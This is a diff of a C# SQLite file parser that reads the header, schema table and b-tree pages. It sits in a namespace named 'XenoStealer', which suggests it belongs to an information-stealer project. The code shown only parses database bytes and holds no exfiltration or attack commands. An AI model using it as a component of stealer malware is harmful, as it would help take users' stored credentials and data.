@@ -1,503 +1,676 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace XenoStealer
 {
-    public class SqlLite3Parser
+    public class SqlLite3Parser//this class took me so much time and documentation reading.
     {
-        private struct record_header_field
-        {
-            public long size;
-            public long type;
-        }
-        
-        private struct sqlite_master_entry
-        {
-            public long row_id;
-            public string item_type;
-            public string item_name;
-            public long root_num;
-            public string sql_statement;
-        }
-        
-        private struct table_entry
-        {
-            public long row_id;
-            public string[] content;
-        }
-        
-        
-        private byte[] db_bytes;
-        private int encoding;
-        private string[] field_names;
-        private sqlite_master_entry[] master_table_entries;
-        private ushort page_size;
-        private byte[] SQLDataTypeSize = new byte[]
-        {
-        0,
-        1,
-        2,
-        3,
-        4,
-        6,
-        8,
-        8,
-        0,
-        0
-        };
-        
-        private table_entry[] table_entries;
-        
+        private List<string> fieldNames = new List<string>();
+        private List<TableEntry> tableEntries = new List<TableEntry>();
+
+
+        private List<MasterTableInfo> MasterTableEntries = new List<MasterTableInfo>();
+
+        Encoding stringEncoding = Encoding.UTF8;
+
+        int pageSize = 65536;
+        int reservedEndPageSize = 0;
+        private byte[] DataBaseBytes;
 
         public SqlLite3Parser(byte[] db_bytes)
         {
-            this.db_bytes = db_bytes;
-            if (Encoding.Default.GetString(db_bytes, 0, 15) != "SQLite format 3" || db_bytes[52] != 0)
+            if (stringEncoding.GetString(db_bytes, 0, 16) != "SQLite format 3\x00")
             {
-                throw new Exception("Not supported!");
+                throw new Exception("Unsupported format");
             }
-        
-            page_size = convertXToUshort(16);
-            encoding = convertXToInt(56);
-            if (encoding == 0)
+            DataBaseBytes = db_bytes;
+
+            ushort pageSizeInfo = ReadUShort(16);
+            if (pageSizeInfo != 1)
             {
-                encoding = 1;
+                pageSize = pageSizeInfo;
+            }
+
+            reservedEndPageSize = ReadByte(20);
+
+            int stringEncodingInfo = ReadInt(56);
+            if (stringEncodingInfo == 2)
+            {
+                stringEncoding = Encoding.Unicode;
+            }
+            else if (stringEncodingInfo == 3)
+            {
+                stringEncoding = Encoding.BigEndianUnicode;
             }
             ReadMasterTable(100);
         }
-        
-     
-        
-        public static T[] CopyArray<T>(T[] sourceArray, int newSize)
+
+        public bool ReadTable(string tableName)
         {
-            if (sourceArray == null)
+
+            MasterTableInfo table = default(MasterTableInfo);
+            foreach (MasterTableInfo masterTable in MasterTableEntries)
             {
-                return new T[newSize];
-            }
-        
-            T[] newArray = new T[newSize];
-            Array.Copy(sourceArray, newArray, Math.Min(sourceArray.Length, newSize));
-            return newArray;
-        }
-        
-        private void ReadMasterTable(ulong Offset)
-        {
-            if (db_bytes[(int)Offset] == 13)
-            {
-                ushort num = (ushort)(convertXToUshort((int)Offset + 3) - 1);
-                int num2 = 0;
-                if (master_table_entries != null)
+                if (masterTable.table_name.ToLower() == tableName.ToLower())
                 {
-                    num2 = master_table_entries.Length;
-                    master_table_entries = CopyArray(master_table_entries, master_table_entries.Length + (int)num + 1);
+                    table = masterTable;
+                    break;
+                }
+            }
+
+            if (table.sql_creation_command == null)
+            {
+                return false;
+            }
+            fieldNames.Clear();
+            string[] names = ExtractColumnNames(table.sql_creation_command);
+            if (ReadTableFromOffset((table.rootpage - 1) * pageSize)) //-1 to ignore the first page.
+            {
+                fieldNames.AddRange(names);
+                return true;
+            }
+            return false;
+        }
+
+        public string[] GetTableNames()
+        {
+            List<string> result = new List<string>();
+            foreach (MasterTableInfo i in MasterTableEntries)
+            {
+                if (i.typename.ToLower() == "table")
+                {
+                    result.Add(i.table_name);
+                }
+            }
+
+            return result.ToArray();
+        }
+
+        public int GetRowCount()
+        {
+            return tableEntries.Count;
+        }
+
+        public string GetTableSqlCommand(string tableName) 
+        {
+            foreach (MasterTableInfo masterTable in MasterTableEntries)
+            {
+                if (masterTable.table_name.ToLower() == tableName.ToLower())
+                {
+                    return masterTable.sql_creation_command;
+                }
+            }
+            return null;
+        }
+
+        public object GetValue(int index, string value)
+        {
+            if (index > tableEntries.Count)
+            {
+                throw new ArgumentOutOfRangeException("index");
+            }
+            int colIndex = fieldNames.IndexOf(value);
+            if (colIndex == -1)
+            {
+                throw new Exception("could not find value");
+            }
+
+            if (value.ToLower() == "id" && tableEntries[index].values[colIndex] == null) 
+            {
+                return tableEntries[index].rowId;
+            }
+
+            return tableEntries[index].values[colIndex];
+        }
+
+        public T GetValue<T>(int index, string value) 
+        {
+            object data = GetValue(index, value);
+            return (T)data;
+        }
+
+        public void reset() 
+        {
+            tableEntries.Clear();
+            fieldNames.Clear();
+            MasterTableEntries.Clear();
+            ReadMasterTable(100);
+        }
+
+        private bool ReadTableFromOffset(int offset) 
+        {
+            byte tableLayout = DataBaseBytes[offset];
+            if (tableLayout == 2) // interior index b-tree page
+            {
+                return false;//not supported
+                // Handle interior index b-tree page
+            }
+            else if (tableLayout == 5) // interior table b-tree page
+            {
+                return ParseInteriorTable(offset);
+                // Handle interior table b-tree page
+            }
+            else if (tableLayout == 10) // leaf index b-tree page
+            {
+                return false; // not supported
+                // Handle leaf index b-tree page
+            }
+            else if (tableLayout == 13) // leaf table b-tree page
+            {
+                return ParseLeafTablePage(offset);
+            }
+            return false;
+        }
+
+        private bool ParseInteriorTable(int headerOffset)
+        {
+            int numberOfCells = ReadUShort(headerOffset + 3);
+            int rightMostPointer = ReadInt(headerOffset + 8);
+
+            int cellPointerOffset = headerOffset + 12;
+
+            for (int i = 0; i < numberOfCells; i++)
+            {
+                int cellOffset = ReadUShort(cellPointerOffset + 2 * i);
+                int childPageNumber;
+
+                if (headerOffset < pageSize)
+                {
+                    childPageNumber = ReadInt(cellOffset);
                 }
                 else
                 {
-                    master_table_entries = new sqlite_master_entry[(int)(num + 1)];
+                    childPageNumber = ReadInt(headerOffset + cellOffset);
                 }
-                int num3 = (int)num;
-                for (int i = 0; i <= num3; i++)
+
+                if (!ReadTableFromOffset((childPageNumber - 1) * pageSize))
                 {
-        
-        
-                    ulong num4 = convertXbyteToNumber((int)Offset + 8 + (i * 2), 2);
-                    if (Offset != 100)
-                    {
-                        num4 += Offset;
-                    }
-                    int num5 = GVL((int)num4);
-                    CVL((int)num4, num5);
-                    int num6 = GVL(num5 + 1);
-                    master_table_entries[num2 + i].row_id = CVL(num5 + 1, num6);
-                    num4 = Convert.ToUInt64(num6 + 1);
-                    num5 = GVL((int)num4);
-                    num6 = num5;
-                    long value = CVL((int)num4, num5);
-                    long[] array = new long[5];
-                    int num7 = 0;
-                    do
-                    {
-                        num5 = num6 + 1;
-                        num6 = GVL(num5);
-                        array[num7] = CVL(num5, num6);
-                        if (array[num7] > 9L)
-                        {
-                            if (IsOdd(array[num7]))
-                            {
-                                array[num7] = (long)Math.Round((array[num7] - 13L) / 2.0);
-                            }
-                            else
-                            {
-                                array[num7] = (long)Math.Round((array[num7] - 12L) / 2.0);
-                            }
-                        }
-                        else
-                        {
-                            array[num7] = SQLDataTypeSize[(int)array[num7]];
-                        }
-                        num7++;
-                    }
-                    while (num7 <= 4);
-        
-        
-                    if (encoding == 1)
-                    {
-                        master_table_entries[num2 + i].item_type = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
-                    }
-                    else if (encoding == 2)
-                    {
-                        master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
-                    }
-                    else if (encoding == 3)
-                    {
-                        master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
-                    }
-                    if (encoding == 1)
-                    {
-                        master_table_entries[num2 + i].item_name = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
-                    }
-                    else if (encoding == 2)
-                    {
-                        master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
-                    }
-                    else if (encoding == 3)
-                    {
-                        master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
-                    }
-                    master_table_entries[num2 + i].root_num = (long)convertXbyteToNumber((int)((long)num4 + value + array[0] + array[1] + array[2]), (int)array[3]);
-                    if (encoding == 1)
-                    {
-                        master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
-                    }
-                    else if (encoding == 2)
-                    {
-                        master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
-                    }
-                    else if (encoding == 3)
-                    {
-                        master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
-                    }
+                    return false;
                 }
-                return;
             }
-            if (db_bytes[(int)Offset] == 5)
+
+            if (!ReadTableFromOffset((rightMostPointer - 1) * pageSize))
             {
-        
-                int num8 = convertXToUshort((int)Offset + 3) - 1;
-                for (int j = 0; j <= num8; j++)
+                return false;
+            }
+
+            return true;
+        }
+
+        private bool ParseLeafTablePage(int headerOffset)
+        {
+            int numberOfCells = ReadUShort(headerOffset + 3);
+            //int cellContentAreaStart = ReadUShort(offset + 5);
+            //if (cellContentAreaStart == 0)
+            //{
+            //    cellContentAreaStart = pageSize;
+            //}
+            //else if (cellContentAreaStart == ushort.MaxValue) 
+            //{
+            //    cellContentAreaStart = 0;
+            //}
+
+            int cellPointerOffset = headerOffset + 8;// The cell pointer array starts immediately after the header.
+
+            int[] offsets = new int[numberOfCells];
+
+            for (int i = 0; i < numberOfCells; i++)
+            {
+                offsets[i] = ReadUShort(cellPointerOffset + 2 * i);
+            }
+
+
+            for (int i = 0; i < offsets.Length; i++)
+            {
+                int CellLocation = offsets[i];
+                if (headerOffset >= pageSize)
                 {
-                    ushort num9 = convertXToUshort((int)Offset + 12 + (j * 2));
-                    if (Offset == 100)
+                    CellLocation += headerOffset;
+                }
+                int numOfBytesInPayload = (int)ReadVarInt(CellLocation, out int byteRead);
+                CellLocation += byteRead;
+
+                int Rowid = (int)ReadVarInt(CellLocation, out byteRead);
+
+                CellLocation += byteRead;
+
+                List<int> SerialTypes = new List<int>();
+
+                long recordHeaderSize = ReadVarInt(CellLocation, out byteRead);
+                CellLocation += byteRead;
+                long end = CellLocation + recordHeaderSize - byteRead;//we include the size of the header itself
+                while (CellLocation < end)
+                {
+                    SerialTypes.Add((int)ReadVarInt(CellLocation, out byteRead));
+                    CellLocation += byteRead;
+                }
+
+                List<object> recordData = new List<object>();
+
+                foreach (int RecordType in SerialTypes)
+                {
+                    object Record;
+
+                    if (RecordType == 0)
                     {
-                        ReadMasterTable((ulong)((convertXToInt(num9) - 1) * page_size));
+                        Record = null;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType == 1)
+                    {
+                        Record = ReadByte(CellLocation);
+                        CellLocation += 1;
+                    }
+                    else if (RecordType == 2)
+                    {
+                        Record = ReadShort(CellLocation);
+                        CellLocation += 2;
+                    }
+                    else if (RecordType == 3)
+                    {
+                        Record = ReadX(CellLocation, 3);
+                        CellLocation += 3;
+                    }
+                    else if (RecordType == 4)
+                    {
+                        Record = ReadInt(CellLocation);
+                        CellLocation += 4;
+                    }
+                    else if (RecordType == 5)
+                    {
+                        Record = ReadX(CellLocation, 6);
+                        CellLocation += 6;
+                    }
+                    else if (RecordType == 6)
+                    {
+                        Record = ReadLong(CellLocation);
+                        CellLocation += 8;
+                    }
+                    else if (RecordType == 7)
+                    {
+                        Record = ReadDouble(CellLocation);
+                        CellLocation += 8;
+                    }
+                    else if (RecordType == 8)
+                    {
+                        Record = 0;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType == 9)
+                    {
+                        Record = 1;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType >= 12 && RecordType % 2 == 0)
+                    {
+                        int blobSize = (RecordType - 12) / 2;
+                        byte[] blob = new byte[blobSize];
+                        Array.Copy(DataBaseBytes, CellLocation, blob, 0, blobSize);
+                        Record = blob;
+                        CellLocation += blobSize;
+                    }
+                    else if (RecordType >= 13 && RecordType % 2 == 1)
+                    {
+                        int stringSize = (RecordType - 13) / 2;
+                        Record = stringEncoding.GetString(DataBaseBytes, CellLocation, stringSize);
+                        CellLocation += stringSize;
                     }
                     else
                     {
-                        ReadMasterTable((ulong)((convertXToInt((int)(Offset + num9)) - 1) * page_size));
+                        continue;
                     }
+                    recordData.Add(Record);
                 }
-                ReadMasterTable((ulong)((convertXToInt((int)(Offset + 8)) - 1) * page_size));
+
+                tableEntries.Add(new TableEntry(Rowid, recordData.ToArray()));
+
             }
+
+            return true;
         }
-        
-        
-        private ulong convertXbyteToNumber(int startIndex, int Size)
+
+        private bool ReadMasterTable(int offset)
         {
-            if (Size > 8 || Size == 0)
+            byte tableLayout = DataBaseBytes[offset];
+            if (tableLayout == 2) // interior index b-tree page
+            {
+                return false; // not supported
+                // Handle interior index b-tree page
+            }
+            else if (tableLayout == 5) // interior table b-tree page
+            {
+                return ParseMasterInteriorTable(offset);
+                // Handle interior table b-tree page
+            }
+            else if (tableLayout == 10) // leaf index b-tree page
+            {
+                return false; // not supported
+                // Handle leaf index b-tree page
+            }
+            else if (tableLayout == 13) // leaf table b-tree page
+            {
+                return ParseMasterLeafTablePage(offset);
+            }
+            return false;
+        }
+
+        private bool ParseMasterInteriorTable(int headerOffset) 
+        {
+            int numberOfCells = ReadUShort(headerOffset + 3);
+            int rightMostPointer = ReadInt(headerOffset + 8);
+
+            int cellPointerOffset = headerOffset + 12;
+
+            for (int i = 0; i < numberOfCells; i++)
+            {
+                int cellOffset = ReadUShort(cellPointerOffset + 2 * i);
+                int childPageNumber;
+
+                if (headerOffset < pageSize)
+                {
+                    childPageNumber = ReadInt(cellOffset);
+                }
+                else
+                {
+                    childPageNumber = ReadInt(headerOffset + cellOffset);
+                }
+
+                if (!ReadMasterTable((childPageNumber - 1) * pageSize))
+                {
+                    return false;
+                }
+            }
+
+            if (!ReadMasterTable((rightMostPointer - 1) * pageSize))
+            {
+                return false;
+            }
+
+            return true;
+        }
+
+        private bool ParseMasterLeafTablePage(int headerOffset) 
+        {
+            int numberOfCells = ReadUShort(headerOffset+3);
+            //int cellContentAreaStart = ReadUShort(offset + 5);
+            //if (cellContentAreaStart == 0)
+            //{
+            //    cellContentAreaStart = pageSize;
+            //}
+            //else if (cellContentAreaStart == ushort.MaxValue) 
+            //{
+            //    cellContentAreaStart = 0;
+            //}
+
+            int cellPointerOffset = headerOffset + 8;// The cell pointer array starts immediately after the header.
+
+            int[] offsets = new int[numberOfCells];
+
+            for (int i = 0; i < numberOfCells; i++)
+            {
+                offsets[i]=ReadUShort(cellPointerOffset + 2 * i);
+            }
+
+
+            for (int i = 0; i < offsets.Length; i++)
+            {
+                int CellLocation = offsets[i];
+                if (headerOffset>=pageSize)
+                {
+                    CellLocation += headerOffset;
+                }
+                int numOfBytesInPayload = (int)ReadVarInt(CellLocation, out int byteRead);
+                CellLocation += byteRead;
+                
+                int Rowid = (int)ReadVarInt(CellLocation, out byteRead);
+                
+                CellLocation += byteRead;
+
+                List<int> SerialTypes = new List<int>();
+
+                long recordHeaderSize = ReadVarInt(CellLocation, out byteRead);
+                CellLocation += byteRead;
+                long end = CellLocation + recordHeaderSize - byteRead;//we include the size of the header itself
+                while (CellLocation < end) 
+                {
+                    SerialTypes.Add((int)ReadVarInt(CellLocation, out byteRead));
+                    CellLocation += byteRead;
+                }
+                
+                if (SerialTypes.Count != 5)//it needs to have a count of 5 or else we dont have enough data and possibly the wrong info.
+                {
+                    continue;
+                }
+
+                List<object> recordData = new List<object>();
+
+                foreach (int RecordType in SerialTypes) 
+                {
+                    object Record;
+
+                    if (RecordType == 0)
+                    {
+                        Record = null;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType == 1)
+                    {
+                        Record = ReadByte(CellLocation);
+                        CellLocation += 1;
+                    }
+                    else if (RecordType == 2)
+                    {
+                        Record = ReadShort(CellLocation);
+                        CellLocation += 2;
+                    }
+                    else if (RecordType == 3)
+                    {
+                        Record = ReadX(CellLocation, 3);
+                        CellLocation += 3;
+                    }
+                    else if (RecordType == 4)
+                    {
+                        Record = ReadInt(CellLocation);
+                        CellLocation += 4;
+                    }
+                    else if (RecordType == 5)
+                    {
+                        Record = ReadX(CellLocation, 6);
+                        CellLocation += 6;
+                    }
+                    else if (RecordType == 6)
+                    {
+                        Record = ReadLong(CellLocation);
+                        CellLocation += 8;
+                    }
+                    else if (RecordType == 7)
+                    {
+                        Record = ReadDouble(CellLocation);
+                        CellLocation += 8;
+                    }
+                    else if (RecordType == 8)
+                    {
+                        Record = 0;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType == 9)
+                    {
+                        Record = 1;
+                        CellLocation += 0;
+                    }
+                    else if (RecordType >= 12 && RecordType % 2 == 0)
+                    {
+                        int blobSize = (RecordType - 12) / 2;
+                        byte[] blob = new byte[blobSize];
+                        Array.Copy(DataBaseBytes, CellLocation, blob, 0, blobSize);
+                        Record = blob;
+                        CellLocation += blobSize;
+                    }
+                    else if (RecordType >= 13 && RecordType % 2 == 1)
+                    {
+                        int stringSize = (RecordType - 13) / 2;
+                        Record = stringEncoding.GetString(DataBaseBytes, CellLocation, stringSize);
+                        CellLocation += stringSize;
+                    }
+                    else 
+                    {
+                        continue;
+                    }
+                    recordData.Add(Record);
+                }
+                if (recordData.Contains(null) || recordData.Count != 5 || recordData[0].GetType()!=typeof(string) || recordData[1].GetType() != typeof(string) || recordData[2].GetType() != typeof(string) || (recordData[3].GetType() != typeof(int) && recordData[3].GetType() != typeof(byte)) || recordData[4].GetType() != typeof(string)) 
+                {
+                    continue;
+                }
+
+                //CREATE TABLE sqlite_schema(
+                //  type text,
+                //  name text,
+                //  tbl_name text,
+                //  rootpage integer,
+                //  sql text
+                //);
+
+                string type = (string)recordData[0];
+                string name = (string)recordData[1];
+                string table_name = (string)recordData[2];
+                int rootpage = recordData.GetType()==typeof(byte)? (int)recordData[3] : (byte)recordData[3];
+                string sql = (string)recordData[4];
+
+
+                MasterTableEntries.Add(new MasterTableInfo(Rowid, type, name, table_name, rootpage, sql));
+            }
+
+            return true;
+        }
+
+        private string[] ExtractColumnNames(string createTableSql)
+        {
+            List<string> columnNames = new List<string>();
+
+            string columnsPart = Regex.Match(createTableSql, @"\((.*?)\)", RegexOptions.Singleline).Groups[1].Value;
+
+            string[] columnDefinitions = columnsPart.Split(',');
+
+            foreach (string definition in columnDefinitions)
+            {
+                string columnName = Regex.Match(definition.Trim(), @"^\s*(\w+)").Groups[1].Value;
+                columnNames.Add(columnName);
+            }
+
+            return columnNames.ToArray();
+        }
+
+        private long ReadVarInt(int offset, out int bytesRead)
+        {
+            long result = 0;
+            bytesRead = 0;
+            for (int i = 0; i < 9; i++)
+            {
+                byte b = DataBaseBytes[offset + i];
+                result = (result << 7) | (long)(b & 0x7F);
+                bytesRead++;
+                if ((b & 0x80) == 0)
+                {
+                    break;
+                }
+            }
+            return result;
+        }
+
+        private ulong ReadX(int StartIndex, int size) 
+        {
+            if (size > 8 || size == 0)
             {
                 return 0;
             }
             ulong byte_toInt = 0;
-            int checkSize = Size - 1;
+            int checkSize = size - 1;
             for (int i = 0; i <= checkSize; i++)
             {
-                byte_toInt = byte_toInt << 8 | db_bytes[startIndex + i];
+                byte_toInt = byte_toInt << 8 | DataBaseBytes[StartIndex + i];
             }
             return byte_toInt;
         }
-        
-        private ushort convertXToUshort(int startIndex)
+
+        private ulong ReadULong(int StartIndex) 
         {
-            return (ushort)convertXbyteToNumber(startIndex, 2);
+            return ReadX(StartIndex, 8);
         }
-        
-        private int convertXToInt(int startIndex)
+
+        private long ReadLong(int StartIndex)
         {
-            return (int)convertXbyteToNumber(startIndex, 4);
+            return (long)ReadX(StartIndex, 8);
         }
-        
-        private long CVL(int startIndex, int endIndex)
+
+        private uint ReadUInt(int StartIndex)
         {
-            endIndex++;
-            byte[] array = new byte[8];
-            int num = endIndex - startIndex;
-            bool flag = false;
-            if (num == 0 | num > 9)
-            {
-                return 0L;
-            }
-            if (num == 1)
-            {
-                array[0] = (byte)(db_bytes[startIndex] & 127);
-                return BitConverter.ToInt64(array, 0);
-            }
-            if (num == 9)
-            {
-                flag = true;
-            }
-            int num2 = 1;
-            int num3 = 7;
-            int num4 = 0;
-            if (flag)
-            {
-                array[0] = db_bytes[endIndex - 1];
-                endIndex--;
-                num4 = 1;
-            }
-            for (int i = endIndex - 1; i >= startIndex; i += -1)
-            {
-                if (i - 1 >= startIndex)
-                {
-                    array[num4] = (byte)(((int)((byte)(db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(db_bytes[i - 1] << (num3 & 7))));
-                    num2++;
-                    num4++;
-                    num3--;
-                }
-                else if (!flag)
-                {
-                    array[num4] = (byte)((int)((byte)(db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2);
-                }
-            }
-            return BitConverter.ToInt64(array, 0);
+            return (uint)ReadX(StartIndex, 4);
         }
-        
-        public int GetRowCount()
+
+        private int ReadInt(int StartIndex)
         {
-            return table_entries.Length;
+            return (int)ReadX(StartIndex, 4);
         }
-        
-        public string[] GetTableNames()
+
+        private ushort ReadUShort(int StartIndex)
         {
-            string[] array = null;
-            int num = 0;
-            int num2 = master_table_entries.Length - 1;
-            for (int i = 0; i <= num2; i++)
-            {
-                if (master_table_entries[i].item_type == "table")
-                {
-                    array = CopyArray(array, num + 1);
-                    array[num] = master_table_entries[i].item_name;
-                    num++;
-                }
-            }
-            return array;
+            return (ushort)ReadX(StartIndex, 2);
         }
-        
-        public string GetValue(int row_num, int field)
+
+        private short ReadShort(int StartIndex)
         {
-            if (row_num >= table_entries.Length)
-            {
-                return null;
-            }
-            if (field >= table_entries[row_num].content.Length)
-            {
-                return null;
-            }
-            return table_entries[row_num].content[field];
+            return (short)ReadX(StartIndex, 2);
         }
-        
-        public string GetValue(int row_num, string field)
+
+        private byte ReadByte(int StartIndex) 
         {
-            int num = -1;
-            int num2 = field_names.Length - 1;
-            for (int i = 0; i <= num2; i++)
-            {
-                if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
-                {
-                    num = i;
-                    break;
-                }
-            }
-            if (num == -1)
-            {
-                return null;
-            }
-            return GetValue(row_num, num);
+            return DataBaseBytes[StartIndex];
         }
-        
-        private int GVL(int startIndex)
+
+        private double ReadDouble(int Startindex) 
+        { 
+            return BitConverter.ToDouble(DataBaseBytes, Startindex);
+        }
+
+
+        private struct MasterTableInfo// I feel like i should create a seperate file for these structs, but would love this class to be plug and play too. im going to keeo these here.
         {
-            if (startIndex > db_bytes.Length)
+            public int rowId;
+            public string typename;
+            public string name;
+            public string table_name;
+            public int rootpage;
+            public string sql_creation_command;
+
+            public MasterTableInfo(int _rowId, string _typename, string _name, string _table_name, int _rootpage, string _sql_creation_command)
             {
-                return 0;
+                rowId = _rowId;
+                typename = _typename;
+                name = _name;
+                table_name = _table_name;
+                rootpage = _rootpage;
+                sql_creation_command = _sql_creation_command;
             }
-            int num = startIndex + 8;
-            for (int i = startIndex; i <= num; i++)
-            {
-                if (i > db_bytes.Length - 1)
-                {
-                    return 0;
-                }
-                if ((db_bytes[i] & 128) != 128)
-                {
-                    return i;
-                }
-            }
-            return startIndex + 8;
         }
-        
-        private bool IsOdd(long value)
+
+        private struct TableEntry
         {
-            return (value & 1L) == 1L;
+            public int rowId;
+            public object[] values;
+            public TableEntry(int _rowId, object[] _values)
+            {
+                rowId = _rowId;
+                values = _values;
+            }
         }
-        
-        public bool ReadTable(string TableName)
-        {
-            int num = -1;
-            int num2 = master_table_entries.Length - 1;
-            for (int i = 0; i <= num2; i++)
-            {
-                if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
-                {
-                    num = i;
-                    break;
-                }
-            }
-            if (num == -1)
-            {
-                return false;
-            }
-            string[] array = master_table_entries[num].sql_statement.Substring(master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[]
-            {
-            ','
-            });
-            int num3 = array.Length - 1;
-            for (int j = 0; j <= num3; j++)
-            {
-                array[j] = array[j].TrimStart(new char[0]);
-                int num4 = array[j].IndexOf(" ");
-                if (num4 > 0)
-                {
-                    array[j] = array[j].Substring(0, num4);
-                }
-                if (array[j].IndexOf("UNIQUE") == 0)
-                {
-                    break;
-                }
-                field_names = CopyArray(field_names, j + 1);
-                field_names[j] = array[j];
-            }
-            return ReadTableFromOffset((ulong)((master_table_entries[num].root_num - 1L) * (long)((ulong)page_size)));
-        }
-        
-        private bool ReadTableFromOffset(ulong Offset)
-        {
-            if (db_bytes[(int)Offset] == 13)
-            {
-                int num = convertXToUshort((int)Offset + 3) - 1;
-                int num2 = 0;
-                if (table_entries != null)
-                {
-                    num2 = table_entries.Length;
-                    table_entries = CopyArray(table_entries, table_entries.Length + num + 1);
-                }
-                else
-                {
-                    table_entries = new table_entry[num + 1];
-                }
-                for (int i = 0; i <= num; i++)
-                {
-                    record_header_field[] array = null;
-                    ulong num4 = convertXToUshort((int)Offset + 8 + i * 2);
-                    if (Offset >= 100)
-                    {
-                        num4 += Offset;
-                    }
-                    int num5 = GVL((int)num4);
-                    CVL((int)num4, num5);
-                    int num6 = GVL(num5 + 1);
-                    table_entries[num2 + i].row_id = CVL(num5 + 1, num6);
-                    num4 = (ulong)(num6 + 1);
-                    num5 = GVL((int)num4);
-                    num6 = num5;
-                    long num7 = CVL((int)num4, num5);
-                    long num8 = (long)num4 - num5 + 1;
-                    int num9 = 0;
-                    while (num8 < num7)
-                    {
-                        CopyArray(table_entries, table_entries.Length + num + 1);
-                        array = CopyArray(array, num9 + 1);
-                        num5 = num6 + 1;
-                        num6 = GVL(num5);
-                        array[num9].type = CVL(num5, num6);
-                        if (array[num9].type > 9)
-                        {
-                            if (IsOdd(array[num9].type))
-                            {
-                                array[num9].size = (long)Math.Round((array[num9].type - 13) / 2.0);
-                            }
-                            else
-                            {
-                                array[num9].size = (long)Math.Round((array[num9].type - 12) / 2.0);
-                            }
-                        }
-                        else
-                        {
-                            array[num9].size = (long)SQLDataTypeSize[array[num9].type];
-                        }
-                        num8 = num8 + (num6 - num5) + 1;
-                        num9++;
-                    }
-                    table_entries[num2 + i].content = new string[array.Length];
-                    int num10 = 0;
-                    for (int j = 0; j < array.Length; j++)
-                    {
-                        if (array[j].type > 9)
-                        {
-                            if (!IsOdd(array[j].type))
-                            {
-                                if (encoding == 1)
-                                {
-                                    table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
-                                }
-                                else if (encoding == 2)
-                                {
-                                    table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
-                                }
-                                else if (encoding == 3)
-                                {
-                                    table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
-                                }
-                            }
-                            else
-                            {
-                                table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
-                            }
-                        }
-                        else
-                        {
-                            table_entries[num2 + i].content[j] = convertXbyteToNumber((int)num4 + (int)num7 + num10, (int)array[j].size).ToString();
-                        }
-                        num10 += (int)array[j].size;
-                    }
-                }
-            }
-            else if (db_bytes[(int)Offset] == 5)
-            {
-                int num12 = convertXToUshort((int)Offset + 3) - 1;
-                for (int k = 0; k <= num12; k++)
-                {
-                    ushort num13 = convertXToUshort((int)Offset + 12 + k * 2);
-                    ReadTableFromOffset((ulong)(convertXToInt((int)(Offset + num13)) - 1) * page_size);
-                }
-                ReadTableFromOffset((ulong)(convertXToInt((int)Offset + 8) - 1) * page_size);
-            }
-            return true;
-        }
+
 
     }
 }
